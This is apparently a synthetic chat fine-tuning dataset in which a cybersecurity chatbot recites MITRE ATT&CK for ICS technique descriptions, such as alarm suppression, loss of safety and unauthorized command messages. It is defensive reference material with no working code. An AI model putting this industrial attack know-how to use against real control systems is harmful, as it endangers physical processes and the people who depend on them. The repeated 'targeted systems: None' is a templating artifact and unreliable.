{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Point & Tag Identification' and with the Id: T0861 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Point & Tag Identification' and with the Id: T0861 is described as follows: Adversaries may collect point and tag values to gain a more comprehensive understanding of the process environment. Points may be values such as inputs, memory locations, outputs or other process specific variables. (Citation: Dennis L. Sloatman September 2016) Tags are the identifiers given to points for operator convenience. Collecting such tags provides valuable context to environmental points and enables an adversary to map inputs, outputs, and other values to their control processes. Understanding the points being collected may inform an adversary on which processes and values to keep track of over the course of an operation.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Device Restart/Shutdown' and with the Id: T0816 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Device Restart/Shutdown' and with the Id: T0816 is described as follows: Adversaries may forcibly restart or shutdown a device in an ICS environment to disrupt and potentially negatively impact physical processes. Methods of device restart and shutdown exist in some devices as built-in, standard functionalities. These functionalities can be executed using interactive device web interfaces, CLIs, and network protocol commands.Unexpected restart or shutdown of control system devices may prevent expected response functions happening during critical states.A device restart can also be a sign of malicious device modifications, as many updates require a shutdown in order to take effect.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'User Execution' and with the Id: T0863 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'User Execution' and with the Id: T0863 is described as follows: Adversaries may rely on a targeted organizations user interaction for the execution of malicious code. User interaction may consist of installing applications, opening email attachments, or granting higher permissions to documents. Adversaries may embed malicious code or visual basic code into files such as Microsoft Word and Excel documents or software installers. (Citation: Booz Allen Hamilton) Execution of this code requires that the user enable scripting or write access within the document. Embedded code may not always be noticeable to the user especially in cases of trojanized software. (Citation: Daavid Hentunen, Antti Tikkanen June 2014) A Chinese spearphishing campaign running from December 9, 2011 through February 29, 2012 delivered malware through spearphishing attachments which required user action to achieve execution. (Citation: CISA AA21-201A Pipeline Intrusion July 2021). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Wireless Compromise' and with the Id: T0860 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Wireless Compromise' and with the Id: T0860 is described as follows: Adversaries may perform wireless compromise as a method of gaining communications and unauthorized access to a wireless network. Access to a wireless network may be gained through the compromise of a wireless device. (Citation: Alexander Bolshev, Gleb Cherbov July 2014) (Citation: Alexander Bolshev March 2014) Adversaries may also utilize radios and other wireless communication devices on the same frequency as the wireless network. Wireless compromise can be done as an initial access vector from a remote distance. A Polish student used a modified TV remote controller to gain access to and control over the Lodz city tram system in Poland. (Citation: John Bill May 2017) (Citation: Shelley Smith February 2008) The remote controller device allowed the student to interface with the trams network to modify track settings and override operator control. The adversary may have accomplished this by aligning the controller to the frequency and amplitude of IR control protocol signals. (Citation: Bruce Schneier January 2008) The controller then enabled initial access to the network, allowing the capture and replay of tram signals. (Citation: John Bill May 2017). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Change Operating Mode' and with the Id: T0858 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Change Operating Mode' and with the Id: T0858 is described as follows: Adversaries may change the operating mode of a controller to gain additional access to engineering functions such as Program Download.   Programmable controllers typically have several modes of operation that control the state of the user program and control access to the controllers API. Operating modes can be physically selected using a key switch on the face of the controller but may also be selected with calls to the controllers API. Operating modes and the mechanisms by which they are selected often vary by vendor and product line. Some commonly implemented operating modes are described below:  * Program - This mode must be enabled before changes can be made to a devices program. This allows program uploads and downloads between the device and an engineering workstation. Often the PLCs logic Is halted, and all outputs may be forced off. (Citation: N.A. October 2017)  * Run - Execution of the devices program occurs in this mode. Input and output (values, points, tags, elements, etc.) are monitored and used according to the programs logic. [Program Upload](https://attack.mitre.org/techniques/T0845) and [Program Download](https://attack.mitre.org/techniques/T0843) are disabled while in this mode. (Citation: Omron) (Citation: Machine Information Systems 2007)  (Citation: N.A. October 2017) (Citation: PLCgurus 2021)   * Remote - Allows for remote changes to a PLCs operation mode. (Citation: PLCgurus 2021)    * Stop - The PLC and program is stopped, while in this mode, outputs are forced off. (Citation: Machine Information Systems 2007)   * Reset - Conditions on the PLC are reset to their original states. Warm resets may retain some memory while cold resets will reset all I/O and data registers. (Citation: Machine Information Systems 2007)   * Test / Monitor mode - Similar to run mode, I/O is processed, although this mode allows for monitoring, force set, resets, and more generally tuning or debugging of the system. Often monitor mode may be used as a trial for initialization. (Citation: Omron). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Alarm Suppression' and with the Id: T0878 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Alarm Suppression' and with the Id: T0878 is described as follows: Adversaries may target protection function alarms to prevent them from notifying operators of critical conditions. Alarm messages may be a part of an overall reporting system and of particular interest for adversaries. Disruption of the alarm system does not imply the disruption of the reporting system as a whole.A Secura presentation on targeting OT notes a dual fold goal for adversaries attempting alarm suppression: prevent outgoing alarms from being raised and prevent incoming alarms from being responded to. (Citation: Jos Wetzels, Marina Krotofil 2019) The method of suppression may greatly depend on the type of alarm in question:  * An alarm raised by a protocol message * An alarm signaled with I/O * An alarm bit set in a flag (and read) In ICS environments, the adversary may have to suppress or contend with multiple alarms and/or alarm propagation to achieve a specific goal to evade detection or prevent intended responses from occurring. (Citation: Jos Wetzels, Marina Krotofil 2019)  Methods of suppression may involve tampering or altering device displays and logs, modifying in memory code to fixed values, or even tampering with assembly level instruction code.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Detect Operating Mode' and with the Id: T0868 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Detect Operating Mode' and with the Id: T0868 is described as follows: Adversaries may gather information about a PLCs or controllers current operating mode. Operating modes dictate what change or maintenance functions can be manipulated and are often controlled by a key switch on the PLC (e.g.,  run, prog [program], and remote). Knowledge of these states may be valuable to an adversary to determine if they are able to reprogram the PLC. Operating modes and the mechanisms by which they are selected often vary by vendor and product line. Some commonly implemented operating modes are described below:  * Program - This mode must be enabled before changes can be made to a devices program. This allows program uploads and downloads between the device and an engineering workstation. Often the PLCs logic Is halted, and all outputs may be forced off. (Citation: N.A. October 2017)  * Run - Execution of the devices program occurs in this mode. Input and output (values, points, tags, elements, etc.) are monitored and used according to the programs logic.[Program Upload](https://attack.mitre.org/techniques/T0845) and [Program Download](https://attack.mitre.org/techniques/T0843) are disabled while in this mode. (Citation: Omron) (Citation: Machine Information Systems 2007)  (Citation: N.A. October 2017) (Citation: PLCgurus 2021)   * Remote - Allows for remote changes to a PLCs operation mode. (Citation: PLCgurus 2021)    * Stop - The PLC and program is stopped, while in this mode, outputs are forced off. (Citation: Machine Information Systems 2007)   * Reset - Conditions on the PLC are reset to their original states. Warm resets may retain some memory while cold resets will reset all I/O and data registers. (Citation: Machine Information Systems 2007)   * Test / Monitor mode - Similar to run mode, I/O is processed, although this mode allows for monitoring, force set, resets, and more generally tuning or debugging of the system. Often monitor mode may be used as a trial for initialization. (Citation: Omron). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Loss of Protection' and with the Id: T0837 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Loss of Protection' and with the Id: T0837 is described as follows: Adversaries may compromise protective system functions designed to prevent the effects of faults and abnormal conditions. This can result in equipment damage, prolonged process disruptions and hazards to personnel. Many faults and abnormal conditions in process control happen too quickly for a human operator to react to. Speed is critical in correcting these conditions to limit serious impacts such as Loss of Control and Property Damage. Adversaries may target and disable protective system functions as a prerequisite to subsequent attack execution or to allow for future faults and abnormal conditions to go unchecked. Detection of a Loss of Protection by operators can result in the shutdown of a process due to strict policies regarding protection systems. This can cause a Loss of Productivity and Revenue and may meet the technical goals of adversaries seeking to cause process disruptions.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Monitor Process State' and with the Id: T0801 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Monitor Process State' and with the Id: T0801 is described as follows: Adversaries may gather information about the physical process state. This information may be used to gain more information about the process itself or used as a trigger for malicious actions. The sources of process state information may vary such as, OPC tags, historian data, specific PLC block information, or network traffic.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Scripting' and with the Id: T0853 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Scripting' and with the Id: T0853 is described as follows: Adversaries may use scripting languages to execute arbitrary code in the form of a pre-written script or in the form of user-supplied code to an interpreter. Scripting languages are programming languages that differ from compiled languages, in that scripting languages use an interpreter, instead of a compiler. These interpreters read and compile part of the source code just before it is executed, as opposed to compilers, which compile each and every line of code to an executable file. Scripting allows software developers to run their code on any system where the interpreter exists. This way, they can distribute one package, instead of precompiling executables for many different systems. Scripting languages, such as Python, have their interpreters shipped as a default with many Linux distributions. In addition to being a useful tool for developers and administrators, scripting language interpreters may be abused by the adversary to execute code in the target environment. Due to the nature of scripting languages, this allows for weaponized code to be deployed to a target easily, and leaves open the possibility of on-the-fly scripting to perform a task.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remote System Information Discovery' and with the Id: T0888 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remote System Information Discovery' and with the Id: T0888 is described as follows: An adversary may attempt to get detailed information about remote systems and their peripherals, such as make/model, role, and configuration. Adversaries may use information from Remote System Information Discovery to aid in targeting and shaping follow-on behaviors. For example, the system's operational role and model information can dictate whether it is a relevant target for the adversary's operational objectives. In addition, the system's configuration may be used to scope subsequent technique usage. Requests for system information are typically implemented using automation and management protocols and are often automatically requested by vendor software during normal operation. This information may be used to tailor management actions, such as program download and system or module firmware. An adversary may leverage this same information by issuing calls directly to the system's API.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Program Upload' and with the Id: T0845 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Program Upload' and with the Id: T0845 is described as follows: Adversaries may attempt to upload a program from a PLC to gather information about an industrial process. Uploading a program may allow them to acquire and study the underlying logic. Methods of program upload include vendor software, which enables the user to upload and read a program running on a PLC. This software can be used to upload the target program to a workstation, jump box, or an interfacing device.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploit Public-Facing Application' and with the Id: T0819 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploit Public-Facing Application' and with the Id: T0819 is described as follows: Adversaries may leverage weaknesses to exploit internet-facing software for initial access into an industrial network. Internet-facing software may be user applications, underlying networking implementations, an assets operating system, weak defenses, etc. Targets of this technique may be intentionally exposed for the purpose of remote management and visibility.An adversary may seek to target public-facing applications as they may provide direct access into an ICS environment or the ability to move into the ICS network. Publicly exposed applications may be found through online tools that scan the internet for open ports and services. Version numbers for the exposed application may provide adversaries an ability to target specific known vulnerabilities. Exposed control protocol or remote access ports found in Commonly Used Port may be of interest by adversaries.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data from Information Repositories' and with the Id: T0811 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data from Information Repositories' and with the Id: T0811 is described as follows: Adversaries may target and collect data from information repositories. This can include sensitive data such as specifications, schematics, or diagrams of control system layouts, devices, and processes. Examples of information repositories include reference databases in the process environment, as well as databases in the corporate network that might contain information about the ICS.(Citation: Cybersecurity & Infrastructure Security Agency March 2018)Information collected from these systems may provide the adversary with a better understanding of the operational environment, vendors used, processes, or procedures of the ICS.In a campaign between 2011 and 2013 against ONG organizations, Chinese state-sponsored actors searched document repositories for specific information such as, system manuals, remote terminal unit (RTU) sites, personnel lists, documents that included the string SCAD*, user credentials, and remote dial-up access information. (Citation: CISA AA21-201A Pipeline Intrusion July 2021). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Transient Cyber Asset' and with the Id: T0864 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Transient Cyber Asset' and with the Id: T0864 is described as follows: Adversaries may target devices that are transient across ICS networks and external networks. Normally, transient assets are brought into an environment by authorized personnel and do not remain in that environment on a permanent basis. (Citation: North American Electric Reliability Corporation June 2021) Transient assets are commonly needed to support management functions and may be more common in systems where a remotely managed asset is not feasible, external connections for remote access do not exist, or 3rd party contractor/vendor access is required. Adversaries may take advantage of transient assets in different ways. For instance, adversaries may target a transient asset when it is connected to an external network and then leverage its trusted access in another environment to launch an attack. They may also take advantage of installed applications and libraries that are used by legitimate end-users to interact with control system devices. Transient assets, in some cases, may not be deployed with a secure configuration leading to weaknesses that could allow an adversary to propagate malicious executable code, e.g., the transient asset may be infected by malware and when connected to an ICS environment the malware propagates onto other systems. . The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Manipulate I/O Image' and with the Id: T0835 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Manipulate I/O Image' and with the Id: T0835 is described as follows: Adversaries may manipulate the I/O image of PLCs through various means to prevent them from functioning as expected. Methods of I/O image manipulation may include overriding the I/O table via direct memory manipulation or using the override function used for testing PLC programs. (Citation: Dr. Kelvin T. Erickson December 2010) During the scan cycle, a PLC reads the status of all inputs and stores them in an image table. (Citation: Nanjundaiah, Vaidyanath) The image table is the PLCs internal storage location where values of inputs/outputs for one scan are stored while it executes the user program. After the PLC has solved the entire logic program, it updates the output image table. The contents of this output image table are written to the corresponding output points in I/O Modules. One of the unique characteristics of PLCs is their ability to override the status of a physical discrete input or to override the logic driving a physical output coil and force the output to a desired status.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Sniffing' and with the Id: T0842 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Sniffing' and with the Id: T0842 is described as follows: Network sniffing is the practice of using a network interface on a computer system to monitor or capture information (Citation: Enterprise ATT&CK January 2018) regardless of whether it is the specified destination for the information. An adversary may attempt to sniff the traffic to gain information about the target. This information can vary in the level of importance. Relatively unimportant information is general communications to and from machines.  Relatively important information would be login information. User credentials may be sent over an unencrypted protocol, such as Telnet, that can be captured and obtained through network packet analysis. In addition, ARP and Domain Name Service (DNS) poisoning can be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Rootkit' and with the Id: T0851 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Rootkit' and with the Id: T0851 is described as follows: Adversaries may deploy rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting and modifying operating-system API calls that supply system information. Rootkits or rootkit-enabling functionality may reside at the user or kernel level in the operating system, or lower. (Citation: Enterprise ATT&CK January 2018)   Firmware rootkits that affect the operating system yield nearly full control of the system. While firmware rootkits are normally developed for the main processing board, they can also be developed for the I/O that is attached to an asset. Compromise of this firmware allows the modification of all of the process variables and functions the module engages in. This may result in commands being disregarded and false information being fed to the main device. By tampering with device processes, an adversary may inhibit its expected response functions and possibly enable [Impact](https://attack.mitre.org/tactics/TA0105).. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Automated Collection' and with the Id: T0802 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Automated Collection' and with the Id: T0802 is described as follows: Adversaries may automate collection of industrial environment information using tools or scripts. This automated collection may leverage native control protocols and tools available in the control systems environment. For example, the OPC protocol may be used to enumerate and gather information. Access to a system or interface with these native protocols may allow collection and enumeration of other attached, communicating servers and devices.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Block Reporting Message' and with the Id: T0804 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Block Reporting Message' and with the Id: T0804 is described as follows: Adversaries may block or prevent a reporting message from reaching its intended target. In control systems, reporting messages contain telemetry data (e.g., I/O values) pertaining to the current state of equipment and the industrial process. By blocking these reporting messages, an adversary can potentially hide their actions from an operator.Blocking reporting messages in control systems that manage physical processes may contribute to system impact, causing inhibition of a response function. A control system may not be able to respond in a proper or timely manner to an event, such as a dangerous fault, if its corresponding reporting message is blocked. (Citation: Bonnie Zhu, Anthony Joseph, Shankar Sastry 2011)  (Citation: Electricity Information Sharing and Analysis Center; SANS Industrial Control Systems March 2016). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Unauthorized Command Message' and with the Id: T0855 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Unauthorized Command Message' and with the Id: T0855 is described as follows: Adversaries may send unauthorized command messages to instruct control system assets to perform actions outside of their intended functionality, or without the logical preconditions to trigger their expected function. Command messages are used in ICS networks to give direct instructions to control systems devices. If an adversary can send an unauthorized command message to a control system, then it can instruct the control systems device to perform an action outside the normal bounds of the device's actions. An adversary could potentially instruct a control systems device to perform an action that will cause an [Impact](https://attack.mitre.org/tactics/TA0105). (Citation: Bonnie Zhu, Anthony Joseph, Shankar Sastry 2011)In the Dallas Siren incident, adversaries were able to send command messages to activate tornado alarm systems across the city without an impending tornado or other disaster. (Citation: Zack Whittaker April 2017) (Citation: Benjamin Freed March 2019). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data Destruction' and with the Id: T0809 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data Destruction' and with the Id: T0809 is described as follows: Adversaries may perform data destruction over the course of an operation. The adversary may drop or create malware, tools, or other non-native files on a target system to accomplish this, potentially leaving behind traces of malicious activities. Such non-native files and other data may be removed over the course of an intrusion to maintain a small footprint or as a standard part of the post-intrusion cleanup process. (Citation: Enterprise ATT&CK January 2018)Data destruction may also be used to render operator interfaces unable to respond and to disrupt response functions from occurring as expected. An adversary may also destroy data backups that are vital to recovery after an incident.Standard file deletion commands are available on most operating system and device interfaces to perform cleanup, but adversaries may use other tools as well. Two examples are Windows Sysinternals SDelete and Active@ Killdisk.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Manipulation of View' and with the Id: T0832 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Manipulation of View' and with the Id: T0832 is described as follows: Adversaries may attempt to manipulate the information reported back to operators or controllers. This manipulation may be short term or sustained. During this time the process itself could be in a much different state than what is reported. (Citation: Corero) (Citation: Michael J. Assante and Robert M. Lee) (Citation: Tyson Macaulay) Operators may be fooled into doing something that is harmful to the system in a loss of view situation. With a manipulated view into the systems, operators may issue inappropriate control sequences that introduce faults or catastrophic failures into the system. Business analysis systems can also be provided with inaccurate data leading to bad management decisions.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data Historian Compromise' and with the Id: T0810 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data Historian Compromise' and with the Id: T0810 is described as follows: Adversaries may compromise and gain control of a data historian to gain a foothold into the control system environment. Access to a data historian may be used to learn stored database archival and analysis information on the control system. A dual-homed data historian may provide adversaries an interface from the IT environment to the OT environment. Dragos has released an updated analysis on CrashOverride that outlines the attack from the ICS network breach to payload delivery and execution.  (Citation: Industroyer - Dragos - 201810) The report summarized that CrashOverride represents a new application of malware, but relied on standard intrusion techniques. In particular, new artifacts include references to a Microsoft Windows Server 2003 host, with a SQL Server. Within the ICS environment, such a database server can act as a data historian. Dragos noted a device with this role should be \"expected to have extensive connections\" within the ICS environment. Adversary activity leveraged database capabilities to perform reconnaissance, including directory queries and network connectivity checks.Permissions Required: AdministratorContributors: Joe Slowik - Dragos. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Service Scanning' and with the Id: T0841 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Service Scanning' and with the Id: T0841 is described as follows: Network Service Scanning is the process of discovering services on networked systems.  This can be achieved through a technique called port scanning or probing.  Port scanning interacts with the TCP/IP ports on a target system to determine whether ports are open, closed, or filtered by a firewall.  This does not reveal the service that is running behind the port, but since many common services are run on [https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml specific port numbers], the type of service can be assumed.  More in-depth testing includes interaction with the actual service to determine the service type and specific version.  One of the most-popular tools to use for Network Service Scanning is [https://nmap.org/ Nmap].An adversary may attempt to gain information about a target device and its role on the network via Network Service Scanning techniques, such as port scanning.  Network Service Scanning is useful for determining potential vulnerabilities in services on target devices.  Network Service Scanning is closely tied to .Scanning ports can be noisy on a network. In some attacks, adversaries probe for specific ports using custom tools. This was specifically seen in the Triton and PLC-Blaster attacks.. The systems targeted by this attack pattern are: Windows, Field Controller/RTU/PLC/IED ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Indicator Removal on Host' and with the Id: T0872 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Indicator Removal on Host' and with the Id: T0872 is described as follows: Adversaries may attempt to remove indicators of their presence on a system in an effort to cover their tracks. In cases where an adversary may feel detection is imminent, they may try to overwrite, delete, or cover up changes they have made to the device.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'I/O Image' and with the Id: T0877 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'I/O Image' and with the Id: T0877 is described as follows: Adversaries may seek to capture process values related to the inputs and outputs of a PLC. During the scan cycle, a PLC reads the status of all inputs and stores them in an image table. (Citation: Nanjundaiah, Vaidyanath) The image table is the PLCs internal storage location where values of inputs/outputs for one scan are stored while it executes the user program. After the PLC has solved the entire logic program, it updates the output image table. The contents of this output image table are written to the corresponding output points in I/O Modules.The Input and Output Image tables described above make up the I/O Image on a PLC. This image is used by the user program instead of directly interacting with physical I/O. (Citation: Spenneberg, Ralf 2016) Adversaries may collect the I/O Image state of a PLC by utilizing a devices [Native API](https://attack.mitre.org/techniques/T0834) to access the memory regions directly. The collection of the PLCs I/O state could be used to replace values or inform future stages of an attack.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Denial of View' and with the Id: T0815 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Denial of View' and with the Id: T0815 is described as follows: Adversaries may cause a denial of view in attempt to disrupt and prevent operator oversight on the status of an ICS environment. This may manifest itself as a temporary communication failure between a device and its control source, where the interface recovers and becomes available once the interference ceases. (Citation: Corero) (Citation: Michael J. Assante and Robert M. Lee) (Citation: Tyson Macaulay) An adversary may attempt to deny operator visibility by preventing them from receiving status and reporting messages. Denying this view may temporarily block and prevent operators from noticing a change in state or anomalous behavior. The environment's data and processes may still be operational, but functioning in an unintended or adversarial manner. . The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Execution through API' and with the Id: T0871 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Execution through API' and with the Id: T0871 is described as follows: Adversaries may attempt to leverage Application Program Interfaces (APIs) used for communication between control software and the hardware. Specific functionality is often coded into APIs which can be called by software to engage specific functions on a device or other software.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Supply Chain Compromise' and with the Id: T0862 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Supply Chain Compromise' and with the Id: T0862 is described as follows: Adversaries may perform supply chain compromise to gain control systems environment access by means of infected products, software, and workflows. Supply chain compromise is the manipulation of products, such as devices or software, or their delivery mechanisms before receipt by the end consumer. Adversary compromise of these products and mechanisms is done for the goal of data or system compromise, once infected products are introduced to the target environment. Supply chain compromise can occur at all stages of the supply chain, from manipulation of development tools and environments to manipulation of developed products and tools distribution mechanisms. This may involve the compromise and replacement of legitimate software and patches, such as on third party or vendor websites. Targeting of supply chain compromise can be done in attempts to infiltrate the environments of a specific audience. In control systems environments with assets in both the IT and OT networks, it is possible a supply chain compromise affecting the IT environment could enable further access to the OT environment.   Counterfeit devices may be introduced to the global supply chain posing safety and cyber risks to asset owners and operators. These devices may not meet the safety, engineering and manufacturing requirements of regulatory bodies but may feature tagging indicating conformance with industry standards. Due to the lack of adherence to standards and overall lesser quality, the counterfeit products may pose a serious safety and operational risk. (Citation: Control Global May 2019) Yokogawa identified instances in which their customers received counterfeit differential pressure transmitters using the Yokogawa logo. The counterfeit transmitters were nearly indistinguishable with a semblance of functionality and interface that mimics the genuine product. (Citation: Control Global May 2019) F-Secure Labs analyzed the approach the adversary used to compromise victim systems with Havex. (Citation: Daavid Hentunen, Antti Tikkanen June 2014) The adversary planted trojanized software installers available on legitimate ICS/SCADA vendor websites. After being downloaded, this software infected the host computer with a Remote Access Trojan (RAT).. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Serial Connection Enumeration' and with the Id: T0854 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Serial Connection Enumeration' and with the Id: T0854 is described as follows: Adversaries may perform serial connection enumeration to gather situational awareness after gaining access to devices in the OT network. Control systems devices often communicate to each other via various types of serial communication mediums. These serial communications are used to facilitate informational communication, as well as commands.  Serial Connection Enumeration differs from I/O Module Discovery, as I/O modules are auxiliary systems to the main system, and devices that are connected via serial connection are normally discrete systems.While IT and OT networks may work in tandem, the exact structure of the OT network may not be discernible from the IT network alone. After gaining access to a device on the OT network, an adversary may be able to enumerate the serial connections. From this perspective, the adversary can see the specific physical devices to which the compromised device is connected to. This gives the adversary greater situational awareness and can influence the actions that the adversary can take in an attack.. The systems targeted by this attack pattern are: Windows, Input/Output Server, Field Controller/RTU/PLC/IED ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Loss of Safety' and with the Id: T0880 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Loss of Safety' and with the Id: T0880 is described as follows: Adversaries may compromise safety system functions designed to maintain safe operation of a process when unacceptable or dangerous conditions occur. Safety systems are often composed of the same elements as control systems but have the sole purpose of ensuring the process fails in a predetermined safe manner. Many unsafe conditions in process control happen too quickly for a human operator to react to. Speed is critical in correcting these conditions to limit serious impacts such as Loss of Control and Property Damage. Adversaries may target and disable safety system functions as a prerequisite to subsequent attack execution or to allow for future unsafe conditionals to go unchecked. Detection of a Loss of Safety by operators can result in the shutdown of a process due to strict policies regarding safety systems. This can cause a Loss of Productivity and Revenue and may meet the technical goals of adversaries seeking to cause process disruptions.. The systems targeted by this attack pattern are: None ."}]}
